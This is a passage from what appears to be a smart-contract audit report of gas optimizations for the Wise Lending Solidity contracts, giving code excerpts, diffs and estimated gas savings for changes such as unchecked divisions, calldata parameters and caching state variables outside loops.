503:        view
504:        returns (uint256)
505:    {
506:        uint256 len = WISE_LENDING.getPositionBorrowTokenLength(
507:            _nftId
508:        );
.
.
.
548:        return weightedRate     // @audit can be unchecked
549:            / overallETH;
550:    }
```

```diff
diff --git a/contracts/WiseSecurity/WiseSecurity.sol b/contracts/WiseSecurity/WiseSecurity.sol
index d2cfb24..568e44c 100644
--- a/contracts/WiseSecurity/WiseSecurity.sol
+++ b/contracts/WiseSecurity/WiseSecurity.sol
@@ -545,8 +545,10 @@ contract WiseSecurity is WiseSecurityHelper, ApprovalHelper {
             }
         }

-        return weightedRate
+        unchecked {
+            return weightedRate
             / overallETH;
+        }
     }
```

Estimated gas saved: 45 gas units.

**Instance 3:**

Unchecked uint divisions in `MainHelper._updatePseudoTotalAmounts()` function to reduce its gas cost.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L525-#L526

```solidity
file: contracts/MainHelper.sol

500:    function _updatePseudoTotalAmounts(
501:        address _poolToken
502:    )
503:        private
504:    {
505:        uint256 currentTime = block.timestamp;
.
.
.
525:        uint256 amountInterest = bareIncrease   //@audit can be unchecked
526:            / PRECISION_FACTOR_YEAR;
527:
528:        uint256 feeAmount = amountInterest
529:            * globalPoolData[_poolToken].poolFee
530:            / PRECISION_FACTOR_E18;
.
.
.
577:    }
```

```diff
diff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol
index 46854bc..de070c3 100644
--- a/contracts/MainHelper.sol
+++ b/contracts/MainHelper.sol
@@ -521,9 +521,11 @@ abstract contract MainHelper is WiseLowLevelHelper {
         }

         delete bufferIncrease[_poolToken];
-
-        uint256 amountInterest = bareIncrease
-            / PRECISION_FACTOR_YEAR;
+        uint256 amountInterest;
+        unchecked {
+            amountInterest = bareIncrease / PRECISION_FACTOR_YEAR;
+        }
+
```

Estimated gas saved: 45 gas units.

**Instance 4:**

Unchecked uint divisions in `MainHelper._updatePseudoTotalAmounts()` function to reduce its gas cost.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L403-#L404

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

386:    function previewDistribution()
387:        public
388:        view
389:        returns (uint256)
390:    {
391:        if (totalLpAssetsToDistribute == 0) {
392:            return 0;
393:        }
394:
395:        if (block.timestamp == lastInteraction) {
396:            return 0;
397:        }
398:
399:        if (totalLpAssetsToDistribute < ONE_WEEK) {
400:            return totalLpAssetsToDistribute;
401:        }
402:
403:        uint256 currentRate = totalLpAssetsToDistribute     // @audit can be unchecked
404:            / ONE_WEEK;
405:
406:        uint256 additonalAssets = currentRate
407:            * (block.timestamp - lastInteraction);
408:
409:        if (additonalAssets > totalLpAssetsToDistribute) {
410:            return totalLpAssetsToDistribute;
411:        }
412:
413:        return additonalAssets;
414:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..c39ed9c 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -400,8 +400,11 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
             return totalLpAssetsToDistribute;
         }

-        uint256 currentRate = totalLpAssetsToDistribute
-            / ONE_WEEK;
+        uint256 currentRate;
+        unchecked {
+            currentRate = totalLpAssetsToDistribute / ONE_WEEK;
+        }
+

         uint256 additonalAssets = currentRate
             * (block.timestamp - lastInteraction);
```

Estimated gas saved: 45 gas units.

**Instance 5:**

Unchecked uint divisions in `AaveHelper._underlyingAsset()` function to reduce its gas cost.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WrapperHub/AaveHelper.sol#L322-#L323

```solidity
file: contracts/WrapperHub/AaveHelper.sol

315:    function getAavePoolAPY(
316:        address _underlyingAsset
317:    )
318:        public
319:        view
320:        returns (uint256)
321:    {
322:        return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate   //@audit can be unchecked
323:            / PRECISION_FACTOR_E9;
324    }
```

```diff
diff --git a/contracts/WrapperHub/AaveHelper.sol b/contracts/WrapperHub/AaveHelper.sol
index eca55d1..a4633bc 100644
--- a/contracts/WrapperHub/AaveHelper.sol
+++ b/contracts/WrapperHub/AaveHelper.sol
@@ -319,7 +319,9 @@ abstract contract AaveHelper is Declarations {
         view
         returns (uint256)
     {
-        return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate
+        unchecked {
+            return AAVE.getReserveData(_underlyingAsset).currentLiquidityRate
             / PRECISION_FACTOR_E9;
+        }
     }
 }
```

Estimated gas saved: 45 gas units.

## [G-08] State variables read in loop in `PendlePowerFarmToken._calculateRewardsClaimedOutside()` function should be avoided.

In the `PendlePowerFarmToken._calculateRewardsClaimedOutside()` function as shown below the state variables `PENDLE_MARKET` and `PENDLE_POWER_FARM_CONTROLLER` (`PENDLE_POWER_FARM_CONTROLLER` was read multiple times in the loop) were read in a loop. Doing it this way isn't efficient; rather we should cache these state variables before the loop then substitute the cached variables for the state variables in the loop implementing this would help avoid `SLOAD` Gwarmaccess (100 gas units) and replace them with cheaper stack reads. The diff below shows how the function should be refactored:

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L239

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L243

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L244

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L249

<details>

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

218:    function _calculateRewardsClaimedOutside()
219:        internal
220:        returns (uint256[] memory)
221:    {
222:        address[] memory rewardTokens = PENDLE_CONTROLLER.pendleChildCompoundInfoRewardTokens(
223:            UNDERLYING_PENDLE_MARKET
224:        );
225:
226:        uint128[] memory lastIndex = PENDLE_CONTROLLER.pendleChildCompoundInfoLastIndex(
227:            UNDERLYING_PENDLE_MARKET
228:        );
229:
230:        uint256 l = rewardTokens.length;
231:        uint256[] memory rewardsOutsideArray = new uint256[](l);
232:
233:        uint256 i;
234:        uint128 index;
235:
236:        while (i < l) {
237:            UserReward memory userReward = _getUserReward(
238:                rewardTokens[i],
239:                PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop
240:            );
241:
242:            if (userReward.accrued > 0) {
243:                PENDLE_MARKET.redeemRewards(        //@audit state variable read in loop
244:                    PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop
245:                );
246:
247:                userReward = _getUserReward(
248:                    rewardTokens[i],
249:                    PENDLE_POWER_FARM_CONTROLLER    //@audit state variable read in loop
250:                );
251:            }
252:
253:            index = userReward.index;
254:
255:            if (lastIndex[i] == 0 && index > 0) {
256:                rewardsOutsideArray[i] = 0;
257:                _overWriteIndex(
258:                    i
259:                );
260:                unchecked {
261:                    ++i;
262:                }
263:                continue;
264:            }
265:
266:            if (index == lastIndex[i]) {
267:                rewardsOutsideArray[i] = 0;
268:                unchecked {
269:                    ++i;
270:                }
271:                continue;
272:            }
273:
274:            uint256 indexDiff = index
275:                - lastIndex[i];
276:
277:            uint256 activeBalance = _getActiveBalance();
278:            uint256 totalLpAssetsCurrent = totalLpAssets();
279:            uint256 lpBalanceController = _getBalanceLpBalanceController();
280:
281:            bool scaleNecessary = totalLpAssetsCurrent < lpBalanceController;
282:
283:            rewardsOutsideArray[i] = scaleNecessary
284:                ? indexDiff
285:                    * activeBalance
286:                    * totalLpAssetsCurrent
287:                    / lpBalanceController
288:                    / PRECISION_FACTOR_E18
289:                : indexDiff
290:                    * activeBalance
291:                    / PRECISION_FACTOR_E18;
292:
293:            _overWriteIndex(
294:                i
295:            );
296:
297:            unchecked {
298:                ++i;
299:            }
300:        }
301:
302:        return rewardsOutsideArray;
303:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..6cb42de 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -233,20 +233,22 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
         uint256 i;
         uint128 index;

+        IPendleMarket _PENDLE_MARKET = PENDLE_MARKET;
+        address _PENDLE_POWER_FARM_CONTROLLER = PENDLE_POWER_FARM_CONTROLLER;
         while (i < l) {
             UserReward memory userReward = _getUserReward(
                 rewardTokens[i],
-                PENDLE_POWER_FARM_CONTROLLER
+                _PENDLE_POWER_FARM_CONTROLLER
             );

             if (userReward.accrued > 0) {
-                PENDLE_MARKET.redeemRewards(
-                    PENDLE_POWER_FARM_CONTROLLER
+                _PENDLE_MARKET.redeemRewards(
+                    _PENDLE_POWER_FARM_CONTROLLER
                 );

                 userReward = _getUserReward(
                     rewardTokens[i],
-                    PENDLE_POWER_FARM_CONTROLLER
+                    _PENDLE_POWER_FARM_CONTROLLER
                 );
             }
```

</details>

Estimated gas saved: 388 gas units per iteration.

## [G-09]  Move lesser gas costing checks to the top

`Revert()` statements that check input arguments or cost less gas than what should be at the top of the function. Checks that involve constants should come before checks that involve state variables, function calls and calculations. By doing these checks first, the function is able to revert before wasting a lot of gas in a function that may ultimately revert in the unhappy case.

Move `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` to the top of the function.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L258-#L276

In the `_checkLiquidatorNft()` function as shown below the if-revert statement `if (positionLocked[_nftIdLiquidator] == true) {revert LiquidatorIsInPowerFarm()}` is more gas consuming than the if-revert statement `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` as the former reads from state which cost `2100` gas units. 

We can make the `_checkLiquidatorNft()` function more gas efficient by moving the cheaper if-revert statement `if (_nftIdLiquidator == _nftId) {revert InvalidLiquidator()}` to the top of the function so that in scenarios where the cheaper revert statement fails the function would revert without having to read from state which is expensive. The diff below shows how the code should be refactored:

```solidity
file: contracts/MainHelper.sol

258:    function _checkLiquidatorNft(
259:        uint256 _nftId,
260:        uint256 _nftIdLiquidator
261:    )
262:        internal
263:        view
264:    {
265:        if (positionLocked[_nftIdLiquidator] == true) {
266:            revert LiquidatorIsInPowerFarm();
267:        }
268:
269:        if (_nftIdLiquidator == _nftId) {
270:            revert InvalidLiquidator();
271:        }
272:
273:        if (_nftIdLiquidator >= POSITION_NFT.getNextExpectedId()) {
274:            revert InvalidLiquidator();
275:        }
276:    }
```

```diff
diff --git a/contracts/MainHelper.sol b/contracts/MainHelper.sol
index 46854bc..d84e200 100644
--- a/contracts/MainHelper.sol
+++ b/contracts/MainHelper.sol
@@ -262,14 +262,14 @@ abstract contract MainHelper is WiseLowLevelHelper {
         internal
         view
     {
-        if (positionLocked[_nftIdLiquidator] == true) {
-            revert LiquidatorIsInPowerFarm();
-        }
-
         if (_nftIdLiquidator == _nftId) {
             revert InvalidLiquidator();
         }

+        if (positionLocked[_nftIdLiquidator] == true) {
+            revert LiquidatorIsInPowerFarm();
+        }
+
         if (_nftIdLiquidator >= POSITION_NFT.getNextExpectedId()) {
             revert InvalidLiquidator();
         }
```

Estimated gas saved: 2100 gas units.

## [G-10] Using calldata instead of memory for read-only arguments in external functions saves gas

**Instance 1:**

Refactor the `PendlePowerFarmToken.initialize()` function to use `calldata` in place of `memory` for the `_tokenName` amd `_symbolName` parameters.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol#L685-#L686

Since the string parameters `_tokenName` amd `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmToken.initialize()` function by using `calldata` in place of `memory` in the definition of the `_tokenName` amd `_symbolName` parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol

682:    function initialize(
683:        address _underlyingPendleMarket,
684:        address _pendleController,
685:        string memory _tokenName,   //@audit use calldata in-place of memory
686:        string memory _symbolName,   //@audit use calldata in-place of memory
687:        uint16 _maxCardinality
688:    )
689:        external
690:    {
.
.
.
732:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
index 9f7bb58..2f53c1d 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmToken.sol
@@ -682,8 +682,8 @@ contract PendlePowerFarmToken is SimpleERC20, TransferHelper {
     function initialize(
         address _underlyingPendleMarket,
         address _pendleController,
-        string memory _tokenName,
-        string memory _symbolName,
+        string calldata _tokenName,
+        string calldata _symbolName,
         uint16 _maxCardinality
     )
```

**Instance 2:**

Refactor the `FeeManager.revokeBeneficial()` function to use `calldata` in place of `memory` for the `_feeTokens` parameter.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L573

Since the `_feeTokens` array is not modified, we can reduce the gas cost of the `FeeManager.revokeBeneficial()` function by using `calldata` in place of `memory` in the definition of the `_feeTokens` parameter. In implementing this we would avoid having to copy the array from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/FeeManager/FeeManager.sol

571:    function revokeBeneficial(
572:        address _user,
573:        address[] memory _feeTokens    //@audit use calldata in-place of memory
574:    )
575:        external
576:        onlyMaster
577:    {
.
.
.
598:    }
```

```diff
diff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol
index f176113..d32aa04 100644
--- a/contracts/FeeManager/FeeManager.sol
+++ b/contracts/FeeManager/FeeManager.sol
@@ -570,7 +570,7 @@ contract FeeManager is FeeManagerHelper {
      */
     function revokeBeneficial(
         address _user,
-        address[] memory _feeTokens
+        address[] calldata _feeTokens
     )
         external
         onlyMaster
```

**Instance 3:**

Refactor the `PendlePowerFarmLeverageLogic.receiveFlashLoan()` function to use `calldata` in place of `memory` for the `_flashloanToken`, `_flashloanAmounts`, `_feeAmounts` and `_userData` parameters.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L60-#L63

Since the `_flashloanToken`, `_flashloanAmounts`, `_feeAmounts` arrays and the `_userData` were not modified, we can reduce the gas cost of the `PendlePowerFarmLeverageLogic.receiveFlashLoan()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the arrays from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: /contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol

59:     function receiveFlashLoan(
60:         IERC20[] memory _flashloanToken,    //@audit use calldata in-place of memory
61:         uint256[] memory _flashloanAmounts,    //@audit use calldata in-place of memory
62:         uint256[] memory _feeAmounts,    //@audit use calldata in-place of memory
63:         bytes memory _userData    //@audit use calldata in-place of memory
64:     )
65:         external
66:     {
.
.
.
129:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol b/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol
index 70644f2..855189c 100644
--- a/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol
+++ b/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol
@@ -57,10 +57,10 @@ abstract contract PendlePowerFarmLeverageLogic is
      * logic. Overwritten with opening flows.
      */
     function receiveFlashLoan(
-        IERC20[] memory _flashloanToken,
-        uint256[] memory _flashloanAmounts,
-        uint256[] memory _feeAmounts,
-        bytes memory _userData
+        IERC20[] calldata _flashloanToken,
+        uint256[] calldata _flashloanAmounts,
+        uint256[] calldata _feeAmounts,
+        bytes calldata _userData
     )
         external
```

**Instance 4:**

Refactor the `PendlePowerFarmController.addPendleMarket()` function to use `calldata` in place of `memory` for the `_tokenName` and `_symbolName` parameters.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol#L213-#L214

Since the strings parameters `_tokenName` and `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmController.addPendleMarket()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol

211:    function addPendleMarket(
212:        address _pendleMarket,
213:        string memory _tokenName,    //@audit use calldata in-place of memory
214:        string memory _symbolName,    //@audit use calldata in-place of memory
215:        uint16 _maxCardinality
216:    )
217:        external
218:        onlyMaster
219:    {
.
.
.
291    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.solindex 15cb863..813cab4 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmController.sol
@@ -210,8 +210,8 @@ contract PendlePowerFarmController is PendlePowerFarmControllerHelper {

     function addPendleMarket(
         address _pendleMarket,
-        string memory _tokenName,
-        string memory _symbolName,
+        string calldata _tokenName,
+        string calldata _symbolName,
         uint16 _maxCardinality
     )
```

**Instance 5:**

Refactor the `PositionNFTs.setBaseURI()` function to use `calldata` in place of `memory` for the `_newBaseURI` parameter.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PositionNFTs.sol#L320

Since the string parameter `_newBaseURI` was not modified, we can reduce the gas cost of the `PositionNFTs.setBaseURI()` function by using `calldata` in place of `memory` in the definition of the `_newBaseURI` parameter. In implementing this we would avoid having to copy the string from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/PositionNFTs.sol

319:    function setBaseURI(
320:        string memory _newBaseURI    //@audit use calldata in-place of memory
321:    )
322:        external
323:        onlyMaster
324:    {
325:        baseURI = _newBaseURI;
326:    }
```

```diff
diff --git a/contracts/PositionNFTs.sol b/contracts/PositionNFTs.sol
index fb680ec..b43253d 100644
--- a/contracts/PositionNFTs.sol
+++ b/contracts/PositionNFTs.sol
@@ -317,7 +317,7 @@ contract PositionNFTs is ERC721Enumerable, OwnableMaster {
      * @dev Allows to update base target for MetaData.
      */
     function setBaseURI(
-        string memory _newBaseURI
+        string calldata _newBaseURI
     )
         external
         onlyMaster
```

**Instance 6:**

Refactor the `PositionNFTs.setBaseExtension()` function to use `calldata` in place of `memory` for the `_newBaseExtension` parameter.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PositionNFTs.sol#L329

Since the string parameter `_newBaseExtension` was not modified, we can reduce the gas cost of the `PositionNFTs.setBaseExtension()` function by using `calldata` in place of `memory` in the definition of the `_newBaseExtension` parameter. In implementing this we would avoid having to copy the string from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/PositionNFTs.sol

328:    function setBaseExtension(
329:        string memory _newBaseExtension    //@audit use calldata in-place of memory
330:    )
331:        external
332:        onlyMaster
333:    {
334:        baseExtension = _newBaseExtension;
335:    }
```

```diff
diff --git a/contracts/PositionNFTs.sol b/contracts/PositionNFTs.sol
index fb680ec..ed078dd 100644
--- a/contracts/PositionNFTs.sol
+++ b/contracts/PositionNFTs.sol
@@ -326,7 +326,7 @@ contract PositionNFTs is ERC721Enumerable, OwnableMaster {
     }

     function setBaseExtension(
-        string memory _newBaseExtension
+        string calldata _newBaseExtension
     )
         external
         onlyMaster
```

**Instance 7:**

Refactor the `PendlePowerFarmTokenFactory.deploy()` function to use `calldata` in place of `memory` for the `_tokenName` and `_symbolName` parameters.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol#L37-#L38

Since the strings parameters `_tokenName` and `_symbolName` were not modified, we can reduce the gas cost of the `PendlePowerFarmTokenFactory.deploy()` function by using `calldata` in place of `memory` in the definition of these parameters. In implementing this we would avoid having to copy the strings from calldata to memory. The diff below shows how the code should be refactored:

```solidity
file: contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol

35:    function deploy(
36:        address _underlyingPendleMarket,
37:        string memory _tokenName,     //@audit use calldata in-place of memory
38:        string memory _symbolName,    //@audit use calldata in-place of memory
39:        uint16 _maxCardinality
40:    )
41:        external
42:        returns (address)
43:    {
44:        if (msg.sender != PENDLE_POWER_FARM_CONTROLLER) {
45:            revert DeployForbidden();
46:        }
47:
48:        return _clone(
49:            _underlyingPendleMarket,
50:            _tokenName,
51:            _symbolName,
52:            _maxCardinality
53:        );
54:    }
```

```diff
diff --git a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol
index 0936d72..836a38b 100644
--- a/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol
+++ b/contracts/PowerFarms/PendlePowerFarmController/PendlePowerFarmTokenFactory.sol
@@ -34,8 +34,8 @@ contract PendlePowerFarmTokenFactory {

     function deploy(
         address _underlyingPendleMarket,
-        string memory _tokenName,
-        string memory _symbolName,
+        string calldata _tokenName,
+        string calldata _symbolName,
         uint16 _maxCardinality
     )
```

## [G-11] Caching the length of calldata increases gas cost instead of reducing it

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract CacheCallDataLength {
    

    function calculateTotal(uint256[5] memory numbers) public pure returns(uint256 total) {
        uint256 len = numbers.length;

        for(uint i; i < len; ++i) {
            total += numbers[i];
        }

    }
}
```

```
test for test/CacheCallDataLength.t.sol:CacheCallDataLengthTest
[PASS] test_calculateTotal() (gas: 1633)
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract NoCacheCallDataLength {
    

    function calculateTotal(uint256[5] memory numbers) public pure returns(uint256 total) {

        for(uint i; i < numbers.length; ++i) {
            total += numbers[i];
        }
        
    }
}
```

```
test for test/NoCacheCallDataLength.t.sol:NoCacheCallDataLengthTest
[PASS] test_calculateTotal() (gas: 1628)
```

**Instance 1:**

Reduce gas cost of `FeeManager.setBeneficial()` function by not caching the length of calldata variable `_feeTokens`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L546

```solidity
file: contracts/FeeManager/FeeManager.sol

538:    function setBeneficial(
539:        address _user,
540:        address[] calldata _feeTokens
541:    )
542:        external
543:        onlyMaster
544:    {
545:        uint256 i;
546:        uint256 l = _feeTokens.length;  //@audit don't cache calldata length
547:
548:        while (i < l) {
549:            _setAllowedTokens(
550:                _user,
551:                _feeTokens[i],
552:                true
553:            );
554:
555:            unchecked {
556:                ++i;
557:            }
.
.
.
565:    }
```

```diff
diff --git a/contracts/FeeManager/FeeManager.sol b/contracts/FeeManager/FeeManager.sol
index f176113..9e78788 100644
--- a/contracts/FeeManager/FeeManager.sol
+++ b/contracts/FeeManager/FeeManager.sol
@@ -543,9 +543,8 @@ contract FeeManager is FeeManagerHelper {
         onlyMaster
     {
         uint256 i;
-        uint256 l = _feeTokens.length;

-        while (i < l) {
+        while (i < _feeTokens.length) {
             _setAllowedTokens(
                 _user,
                 _feeTokens[i],
```

**Instance 2:**

Reduce gas cost of `FeeManager.setBeneficial()` function by not caching the length of calldata variable `_feeTokens`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L293

```solidity
file: contracts/WiseOracleHub/WiseOracleHub.sol

266:    function addTwapOracleDerivative(
267:        address _tokenAddress,
268:        address _partnerTokenAddress,
269:        address[2] calldata _uniPools,
270:        address[2] calldata _token0Array,
271:        address[2] calldata _token1Array,
272:        uint24[2] calldata _feeArray
273:    )
274:        external
275:        onlyMaster
276:    {
.
.
.
291:        uint256 i;
292:        address pool;
293:        uint256 length = _uniPools.length;  //@audit don't cache calldata length
294:
295:        while (i < length) {
296:            pool = _getPool(
297:                _token0Array[i],
298:                _token1Array[i],
299:                _feeArray[i]
300:            );
301:
302:            _validatePoolAddress(
303:                pool,
304:                _uniPools[i]
305:            );
306:
307:            unchecked {
308:                ++i;
309:            }
310:        }
.
.
.
321:    }
```

```diff
diff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol
index 12fe0c8..f105337 100644
--- a/contracts/WiseOracleHub/WiseOracleHub.sol
+++ b/contracts/WiseOracleHub/WiseOracleHub.sol
@@ -290,9 +290,8 @@ contract WiseOracleHub is OracleHelper {

         uint256 i;
         address pool;
-        uint256 length = _uniPools.length;

-        while (i < length) {
+        while (i < _uniPools.length) {
             pool = _getPool(
                 _token0Array[i],
                 _token1Array[i],
```

**Instance 3:**

Reduce gas cost of `WiseOracleHub.addOracleBulk()` function by not caching the length of calldata variable `_tokenAddresses`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L388

```solidity
file: contracts/WiseOracleHub/WiseOracleHub.sol

379:    function addOracleBulk(
380:        address[] calldata _tokenAddresses,
381:        IPriceFeed[] calldata _priceFeedAddresses,
382:        address[][] calldata _underlyingFeedTokens
383:    )
384:        external
385:        onlyMaster
386:    {
387:        uint256 i;
388:        uint256 l = _tokenAddresses.length;
389:
390:        while (i < l) {
391:            _addOracle(
392:                _tokenAddresses[i],
393:                _priceFeedAddresses[i],
394:                _underlyingFeedTokens[i]
395:            );
396:
397:            unchecked {
398:                ++i;
399:            }
400:        }
401:    }
```

```diff
diff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol
index 12fe0c8..ecc8e55 100644
--- a/contracts/WiseOracleHub/WiseOracleHub.sol
+++ b/contracts/WiseOracleHub/WiseOracleHub.sol
@@ -385,9 +385,8 @@ contract WiseOracleHub is OracleHelper {
         onlyMaster
     {
         uint256 i;
-        uint256 l = _tokenAddresses.length;

-        while (i < l) {
+        while (i < _tokenAddresses.length) {
             _addOracle(
                 _tokenAddresses[i],
                 _priceFeedAddresses[i],
```

**Instance 4:**

Reduce gas cost of `WiseOracleHub.recalibrateBulk()` function by not caching the length of calldata variable `_tokenAddresses`.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseOracleHub/WiseOracleHub.sol#L507

```solidity
file: contracts/WiseOracleHub/WiseOracleHub.sol

501:    function recalibrateBulk(
502:        address[] calldata _tokenAddresses
503:    )
504:        external
505:    {
506:        uint256 i;
507:        uint256 l = _tokenAddresses.length;
508:
509:        while (i < l) {
510:            _recalibrate(
511:                _tokenAddresses[i]
512:            );
513:
514:            unchecked {
515:                ++i;
516:            }
517:        }
518:    }
```

```diff
diff --git a/contracts/WiseOracleHub/WiseOracleHub.sol b/contracts/WiseOracleHub/WiseOracleHub.sol
index 12fe0c8..169243e 100644
--- a/contracts/WiseOracleHub/WiseOracleHub.sol
+++ b/contracts/WiseOracleHub/WiseOracleHub.sol
@@ -504,9 +504,8 @@ contract WiseOracleHub is OracleHelper {
         external
     {
         uint256 i;
-        uint256 l = _tokenAddresses.length;

-        while (i < l) {
+        while (i < _tokenAddresses.length) {
             _recalibrate(
                 _tokenAddresses[i]
             );
```

## [G-12] Avoid emitting event on every iteration

Expensive operations should always try to be avoided within loops. Such operations include: reading/writing to storage, heavy calculations, external calls and emitting events. In this instance, an event is being emitted every iteration. Events have a base cost of Glog (375 gas) per emit and Glogdata (8 gas) * number of bytes in event. We can avoid incurring those costs each iteration by emitting the event outside of the loop.

https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/FeeManager/FeeManager.sol#L156-#L160

```solidity
file: contracts/FeeManager/FeeManager.sol

135:    function setPoolFeeBulk(
136:        address[] calldata _poolTokens,
137:        uint256[] calldata _newFees
138:    )
139:        external
140:        onlyMaster
141:    {
142:        uint256 i;
143:        uint256 l = _poolTokens.length;
144:
145:        while (i < l) {
146:
147:            _checkValue(
148:                _newFees[i]
149:            );
150:
151:            WISE_LENDING.setPoolFee(
152:                _poolTokens[i],
153:                _newFees[i]
154:            );
155:
156:            emit PoolFeeChanged(    //@audit event emitted in loop
157:                _poolTokens[i],
158:                _newFees[i],
159:                block.timestamp
160:            );
161:
162:            unchecked {
163:                ++i;
164:            }
165:        }
166:    }
```

## [G-13] memory variable should created outside of loop

Memory variable should created outside of loop and get overridden with each iteration of loop. By doing so we save gas cost for memory variable creation in each iteration.

### Proof of Concept

```solidity
contract VarInLoop {

    uint256[] numbers = [1,2,3,4,5];
    uint256 total;

    function double(uint256 num) public pure returns(uint256 ans) {
        ans = num * 2;
    }

    function doubleNumbers() public {
        uint256 len = numbers.length;

        for(uint256 i; i < len; ++i) {
            uint256 doubleNum =  double(numbers[i]);
            total = total + doubleNum;
        }
    }
}
```

```
test for test/VarInLoop.t.sol:VarInLoopTest
[PASS] test_doubleNumbers() (gas: 38185)
```

```
contract VarOutLoop {

    uint256[] numbers = [1,2,3,4,5];
    uint256 total;

    function double(uint256 num) public pure returns(uint256 ans) {
        ans = num * 2;
    }

    function doubleNumbers() public {
        uint256 len = numbers.length;

        uint256 doubleNum;
